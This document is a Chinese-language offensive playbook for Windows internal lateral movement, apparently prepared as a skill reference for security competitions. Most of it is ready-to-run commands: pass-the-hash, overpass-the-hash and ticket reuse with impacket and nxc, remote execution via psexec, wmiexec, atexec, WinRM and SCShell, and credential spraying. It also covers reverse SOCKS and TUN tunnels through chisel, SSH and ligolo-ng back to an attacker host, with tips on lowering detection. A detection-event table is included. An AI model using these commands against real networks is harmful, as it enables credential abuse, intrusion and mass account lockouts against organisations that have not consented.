# Windows 内网横移：PtH/PtT/OPtH、四种执行手法的留痕、代理搭建对比

> 被 `competition-windows-pivot` 引用。横移的判据只有一条：**目的主机上出现了什么能力**。
> 不是「我发了命令」，也不是「工具说成功了」。
>
> 本文顺序：三种「无明文」路径的区别 → 五种执行通道的留痕 → 凭据复用策略 → 代理/隧道对比 → 验伤与坑。

## 一、三种「无明文」路径：别混

| 路径 | 需要什么 | 认证协议 | 能访问什么 | 留下什么 |
| --- | --- | --- | --- | --- |
| **PtH**（Pass-the-Hash） | NT 哈希 | **NTLM** | 接受 NTLM 的服务（SMB/WMI/部分 WinRM） | 目标 4624 Type3 `NtLmSsp`；**DC 无 4768** |
| **OPtH**（Overpass-the-Hash） | NT 哈希 / AES key | **Kerberos** | 任何接受 Kerberos 的服务 | DC **4768**（`Pre-Auth Type=2`）+ 目标 4624 |
| **PtT**（Pass-the-Ticket） | `.kirbi` / `.ccache` | **Kerberos** | 票允许的服务（受 SPN 限制） | 目标 4624，**DC 无 4768**（票是之前签的） |

**最容易搞混的一条**：PtH 与 OPtH 都用哈希，但**协议不同**。
- 目标禁了 NTLM → PtH 死，OPtH 活。
- 目标要求 Kerberos 审计/需要访问只认 Kerberos 的服务（如某些 WinRM 配置）→ 必须 OPtH。

### 命令对照

```bash
# PtH（NTLM）
nxc smb 10.0.0.30 -u administrator -H 2b576acbe6bcfda7294d6bd18041b8fe -d corp.local
impacket-wmiexec -hashes :2b576acbe6bcfda7294d6bd18041b8fe corp.local/administrator@10.0.0.30

# OPtH（哈希换 TGT，之后全走 Kerberos）
impacket-getTGT corp.local/administrator -hashes :2b576acbe6bcfda7294d6bd18041b8fe -dc-ip 10.0.0.10
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass corp.local/administrator@ws01.corp.local

# OPtH 的 AES 版本（更隐蔽，不需要 RC4）
impacket-getTGT corp.local/administrator -aesKey <AES256_HEX> -dc-ip 10.0.0.10

# PtT（用已有票）
export KRB5CCNAME=/tmp/admin_tgt.ccache
impacket-smbclient -k -no-pass //dc01.corp.local/c$
```

**OPtH 的判据细节**：`getTGT` 成功后 `klist` 里应有一张 `krbtgt/CORP.LOCAL@CORP.LOCAL`。
若报 `KDC_ERR_PREAUTH_FAILED` → 哈希不对（可能是 `msCacheV2` 而不是 NT 哈希）。
若报 `KDC_ERR_ETYPE_NOSUPP` → 域禁了 RC4，改用 `-aesKey`。

## 二、五种执行通道：机理与留痕对照

| 通道 | 机理 | 目标侧关键痕迹 | 需要什么 |
| --- | --- | --- | --- |
| **SMB（psexec）** | 上传服务二进制到 `ADMIN$`，注册服务并启动 | **7045** 服务安装 + `ADMIN$` 文件写入（5145）+ 4688 进程（父进程 `services.exe`） | 目标管理员 + 445 通 |
| **SMB（smbexec）** | 创建服务，`binPath` 直接是 `cmd /c ...` 输出重定向到文件 | **7045** + `cmd.exe` 由 `services.exe` 起 | 同上 |
| **WMI（wmiexec）** | `Win32_Process::Create` 远程建进程 | 4688（父进程 `WmiPrvSE.exe`）+ Sysmon 19/20/21 | 管理员 + 135 + 动态 RPC 端口 |
| **WinRM（evil-winrm / nxc）** | WS-Management（5985/5986） | 4688（父进程 `wsmprovhost.exe`）+ 4624 Type3 + `Microsoft-Windows-WinRM` 日志 | 管理员或被加进 `Remote Management Users` |
| **RDP** | 交互式会话 | 4624 Type10 + `TerminalServices` 日志（1149）+ `Security` 4778/4779 | 目标允许 RDP + 用户在 `Remote Desktop Users` |
| **SCShell / 远程改服务** | 改已有服务的 `ImagePath`，触发启动，事后还原 | **7040**（服务配置变更）+ 7045（若新建） | 目标管理员 + 服务控制权限 |
| **计划任务（atexec）** | 远程注册任务 | **4698** + 106（TaskScheduler） | 管理员 |

### 命令

```bash
# psexec（最吵，但最稳）
impacket-psexec corp.local/administrator:'P@ss'@10.0.0.30

# smbexec（不落二进制，但仍建服务）
impacket-smbexec corp.local/administrator:'P@ss'@10.0.0.30

# wmiexec（无服务、无文件落地，最常用）
impacket-wmiexec corp.local/administrator:'P@ss'@10.0.0.30

# atexec（计划任务，适合一次性命令）
impacket-atexec corp.local/administrator:'P@ss'@10.0.0.30 'whoami > C:\temp\o.txt'

# WinRM
nxc winrm 10.0.0.30 -u administrator -p 'P@ss' -d corp.local -x 'whoami /priv'
evil-winrm -i 10.0.0.30 -u administrator -p 'P@ss'

# SCShell（改服务 ImagePath，不留新服务，痕迹最少但要还原）
SCShell.exe 10.0.0.30 'C:\Windows\System32\drivers\mshidkmdf.sys' \
  'cmd /c whoami > C:\temp\o.txt' -hashes :<NTHASH>
```

**SCShell 的特点**：它**不创建新服务**，改的是已有驱动服务的 `ImagePath`，
执行后立刻改回。所以只留 **7040**（配置变更），不留 7045。这是「低噪声服务执行」的首选，
代价是**必须记得它改过哪个服务**（否则服务坏了没人知道）。

## 三、留痕细节：每个通道在日志里长什么样

### psexec 的三条铁证

```
System 7045:
  Service Name:  PSEXESVC        ← 或随机名（新版可改）
  Image Path:    C:\Windows\PSEXESVC.exe
  Service Type:  user mode service
  Start Type:    demand start

Security 5145（Detailed File Share）:
  Share Name:    \\*\ADMIN$
  Relative Target: PSEXESVC.exe

Security 4688 / Sysmon 1:
  Parent: C:\Windows\system32\services.exe
  Image:  C:\Windows\PSEXESVC.exe
```

**三条同时出现 = 几乎一定是 psexec**。缺 5145 说明「详细文件共享审计」没开。

### wmiexec 的特征链

```
4688 / Sysmon 1:
  Parent: C:\Windows\System32\wbem\WmiPrvSE.exe
  Image:  C:\Windows\System32\cmd.exe
  CommandLine: cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1700000000.123 2>&1
```

**`\\127.0.0.1\ADMIN$` 这个回环路径是 wmiexec 的签名**——正常业务几乎不会这么写。

### WinRM 的特征

```
4688: Parent = wsmprovhost.exe        ← 远程 PowerShell 的宿主
4624 Type 3: Authentication Package = Kerberos 或 NTLM（取决于配置）
Microsoft-Windows-WinRM/Operational:
  Event 91/168: 用户 X 从 IP Y 建立会话
```

**WinRM 的隐蔽优势**：**不落文件、不建服务**。只要 5985 通、账号有权限，
痕迹只有「一个 remotepowershell 会话」。这也是为什么它是现代横移的首选。

### RDP 的特征

```
Security 4624 Type 10（RemoteInteractive）
Security 4778/4779（会话重连/断开）
Microsoft-Windows-TerminalServices-LocalSessionManager/Operational:
  Event 21（会话登录）、24（断开）、25（重连）
```

**RDP 独有的价值**：它是 **Type 10**，会在目标 LSASS **留下可 dump 的凭据**。
所以「RDP 到一台机器」不仅是横移，还是**凭据采集**机会。

### 计划任务的特征

```
Security 4698（任务创建）+ 4702（更新）
Microsoft-Windows-TaskScheduler/Operational: 106（任务注册）、200（动作开始）、201（完成）
```

任务 XML 里 `Command` / `Arguments` 是明文，**这是最容易被规则命中的地方**。

## 四、凭据复用策略：先试哪个

横移不是「拿到一个哈希就全网打」。按这个顺序，命中率最高、噪声最低：

| 顺序 | 用什么 | 为什么 | 命令 |
| --- | --- | --- | --- |
| 1 | **当前已登录用户的票**（本地已有 TGT） | 零成本、零新认证 | `klist` → `-k -no-pass` |
| 2 | **域管哈希**（从 LSASS/缓存拿的） | 域管在域内几乎处处管理员 | `nxc smb <range> -u administrator -H <h>` |
| 3 | **本地管理员哈希**（同一密码复用） | 镜像装机的环境里本地管理员口令常全同 | `nxc smb <range> -u localadmin -H <h> --local-auth` |
| 4 | **服务账号**（有 SPN 的） | 权限常在特定服务器上 | `nxc smb <range> -u svc_x -H <h>` |
| 5 | **机器账号哈希**（`WS01$`） | 用于 RBCD/Shadow Credentials，不是直接登录 | 见 `relay-coercion-chain.md` |

```bash
# 批量喷洒（**会触发锁定**，必须先确认策略）
nxc smb 10.0.0.0/24 -u localadmin -H <NTHASH> --local-auth --shares
nxc smb 10.0.0.0/24 -u administrator -H <NTHASH> -d corp.local

# 密码喷洒（一账号多主机，比一主机多密码安全，但仍有锁定风险）
nxc smb 10.0.0.0/24 -u users.txt -p 'Summer2026!' -d corp.local --continue-on-success
```

**喷洒前必须读的策略**：

```bash
nxc smb 10.0.0.10 -u '' -p '' --pass-pol
# Lockout threshold: 3   → 每账号最多 2 次尝试，绝对不能喷
# Lockout threshold: None → 可以喷
# Lockout observation window: 30 → 3 次失败后锁 30 分钟
```

**这条判据优先于任何工具**：锁定策略为 3 时喷洒 = 把全公司账号锁掉 = 立刻被发现。

## 五、跳板与代理搭建：四种方案对比

| 方案 | 传输 | 需要什么 | 优点 | 缺点 |
| --- | --- | --- | --- | --- |
| **SSH 动态转发（SOCKS）** | SSH（22） | 目标有 sshd + 凭据 | 零落地、系统自带 | 只能 TCP；需要 sshd |
| **chisel** | HTTP(S)（单端口） | 能上传一个二进制 | 穿代理、单端口、支持 SOCKS5 + 端口转发 | 二进制要落地；流量特征明显 |
| **ligolo-ng** | TLS（单端口） | 一个 agent + 一个 proxy | **TUN 接口**，支持任意协议（含 ICMP/UDP）、多跳 | 需要建虚拟网卡（需管理员/root） |
| **frp / suo5** | 自定义/HTTP | 服务端 + 客户端 | 稳定、可复用 | 需要自己的 VPS |

### SSH 动态转发（最省事）

```bash
# 动态 SOCKS5（在 1080 上）
ssh -D 1080 -N -f user@10.0.0.20
# 之后：proxychains4 nxc smb 10.0.0.30 ...

# 转发单个端口
ssh -L 13389:10.0.0.30:3389 user@10.0.0.20

# 反向（把目标端口拉回自己）
ssh -R 13389:127.0.0.1:3389 user@myvps

# 复用已有连接（多跳）
ssh -J user@10.0.0.20 user@10.0.0.30
```

### chisel（单端口穿墙）

```bash
# 服务端（攻击机）
chisel server -p 8080 --reverse --socks5

# 客户端（目标，反向上线）
chisel client 10.0.0.99:8080 R:socks
# 本地 1080 出现 SOCKS5

# 反向端口转发（把目标内网的 3389 拉到本地 13389）
chisel client 10.0.0.99:8080 R:13389:10.0.0.30:3389

# 走 HTTP 代理上线
chisel client --proxy http://proxy:8080 10.0.0.99:8080 R:socks
```

### ligolo-ng（TUN，支持非 TCP）

```bash
# 攻击机：起 proxy（TLS 自签证书；-laddr 必须给，默认只听 127.0.0.1）
proxy -selfcert -laddr 0.0.0.0:11601

# 目标：agent 上线（-ignore-cert 因为代理是自签）
agent -connect 10.0.0.99:11601 -ignore-cert

# 在 proxy 交互界面里依次：
#   session                     → 选中刚上线的 agent
#   iface                       → 看 agent 能到的网段与接口
#   start                       → 创建 tun 接口（默认 ligolo0）
#   tunnel_start --tun ligolo0   → 启动隧道
# 退出交互后加路由：
sudo ip route add 10.0.0.0/24 dev ligolo0
# 之后直接 ping/扫 10.0.0.30，就像它在本地
```

**ligolo 的独特价值**：它是**三层隧道**，能跑 ICMP（ping）、UDP（DNS）、任意协议。
chisel/SSH 只能 TCP。所以「需要 ping 通才能继续的下一步」只能靠 ligolo。

### 四者选择判据

| 你要做什么 | 选哪个 |
| --- | --- |
| 只需要 TCP（SMB/RDP/HTTP） | SSH `-D` 或 chisel |
| 目标没有 sshd | chisel |
| 出口只允许 80/443，有 HTTP 代理 | chisel `--proxy` |
| 需要 UDP/ICMP，或要做完整的内网扫描 | ligolo-ng |
| 需要长期稳定、可多人复用 | frp / suo5（见对应技能） |

## 六、验伤：怎么证明「横移真的到了目的主机」

| 层 | 证据 | 反例 |
| --- | --- | --- |
| L1 执行成功 | 命令有回显 | 只有 `[+]` 没有回显 → 连接建了但命令没执行 |
| L2 目的主机有记录 | 4688 / Sysmon 1 出现对应进程，父进程正确 | 只在攻击机上有输出，目的机无进程 → 是本地执行冒充 |
| L3 拿到权限 | `whoami /priv` 有 `SeDebugPrivilege` 等；能读 `C$`、能 `--sam` | 登录成功但 `whoami /groups` 只有 `Domain Users` → 权限没到 |
| L4 持久可用 | 断开后重新连还能用（凭据/票未过期） | 只有首次成功，之后 401 → 票过期或会话未复用 |

**具体命令**：

```bash
# 一次调用同时验三层
nxc smb 10.0.0.30 -u administrator -H <NTHASH> -d corp.local --shares --sam

# 票据侧
export KRB5CCNAME=/tmp/a.ccache
impacket-smbclient -k -no-pass //ws01.corp.local/c$ -c 'ls'
klist    # 确认票未过期
```

**四个典型假阳性**：
1. `psexec` 打出 `[*] Requesting shares on ...` 就卡住 → 445 通但 `ADMIN$` 不可写（不是管理员）。
2. `wmiexec` 有回显但内容是上一台机器的 → 会话串了（`KRB5CCNAME` 指错）。
3. `nxc` 显示 `[+]` 但 `--shares` 空 → 认证通过但无共享权限。
4. WinRM 登录成功但 `-x` 无输出 → 目标 PowerShell 被执行策略或 ConStrained Language 限制。

## 七、检测视角

| 动作 | 日志 | 信号 |
| --- | --- | --- |
| PtH | 目标 **4624 Type3** | `Logon Process=NtLmSsp`、`Authentication Package=NTLM`，且 **DC 无 4768** |
| OPtH | DC **4768** | `Pre-Auth Type=2`（加密时间戳），且无对应交互登录 4648 |
| PtT | 目标 **4624 Type3** | `Authentication Package=Kerberos`，但 DC **无对应 4769**（票是旧的） |
| psexec | **7045** + 5145 + 4688 | 服务名随机/`PSEXESVC`，`ImagePath` 指向 `ADMIN$` |
| smbexec | **7045** | `ImagePath` 含 `cmd.exe /Q /c` |
| SCShell | **7040**（服务配置变更） | 已有服务的 `ImagePath` 被改成 `cmd.exe` 又改回 |
| wmiexec | 4688 + 5145 | 父进程 `WmiPrvSE.exe`，命令行含 `\\127.0.0.1\ADMIN$` |
| WinRM | 4688 + WinRM/Operational 91 | 父进程 `wsmprovhost.exe`；`Remote Management Users` 成员的异常登录 |
| RDP | 4624 Type10 + 4778 | `TerminalServices` 会话事件；来源 IP 非常规 |
| 计划任务 | **4698** + 106 | 任务 `Command` 指向 `%TEMP%` 或 UNC 路径 |
| 批量横移 | 4624 跨主机聚合 | 同一源 IP 在 10 分钟内对 ≥5 台主机 Type3 登录 |

**蓝队最有效的一条**：**「同一源 IP 短时间内对多台主机 4624 Type3」**。
正常管理动作很少这样，自动化横移一定这样。

**响度排序**：psexec（7045 + 5145 + 4688，三条）= **极高**；
smbexec（7045）= **高**；SCShell（7040）= **中**；
wmiexec（4688 父进程异常）= **中**；WinRM（仅会话日志）= **中低**；
PtT（无 DC 记录）= **低**。

## 八、常见坑

1. **用 IP 做 Kerberos**。`-k -no-pass //10.0.0.30/c$` 一定失败（无 SPN 匹配）。
   必须 FQDN：`//ws01.corp.local/c$`。
2. **`KRB5CCNAME` 指向过期票**。`klist` 看 `End Time`；过期就重新 `getTGT`，不要怀疑网络。
3. **PtH 去打禁 NTLM 的目标**。表现是 `STATUS_LOGON_FAILURE` 而不是「连接失败」——
   很容易被误判成哈希错。改走 OPtH（`getTGT` + `-k`）。
4. **psexec 上传被杀软删**。`PSEXESVC.exe` 是公开特征；改用 `smbexec` 或 `wmiexec`（不落二进制）。
5. **WinRM 5985 通但登录失败**。账号不在 `Remote Management Users` 或 `Administrators`；
   或者目标只开了 5986（HTTPS）而你连 5985。
6. **wmiexec 卡住无回显**。多为 135 通但**动态 RPC 端口（1024-65535）被防火墙拦**。
   改 `-dc-ip` 无关；要么开端口范围，要么换 WinRM。
7. **代理链里 DNS 解析失败**。SOCKS5 的 `-D` 只代理 TCP，DNS 默认本地解析；
   `proxychains` 要加 `proxy_dns`，否则内网域名解析不到。
8. **ligolo 没加路由**。`tunnel_start` 之后必须 `ip route add`，否则 ping 不通（这是最常见的一步漏）。
9. **SCShell 改了服务没还原**。它自带还原逻辑，但中途断线会留下坏掉的 `ImagePath`；
   用完 `sc qc <service>` 确认一次。
10. **不区分「认证成功」与「管理员」**。`nxc` 的 `(Pwn3d!)` 才是管理员，`[+]` 只是认证通过。
    报告里写「拿到主机」之前，必须有 `--sam` 或 `--shares` 的实际读取结果。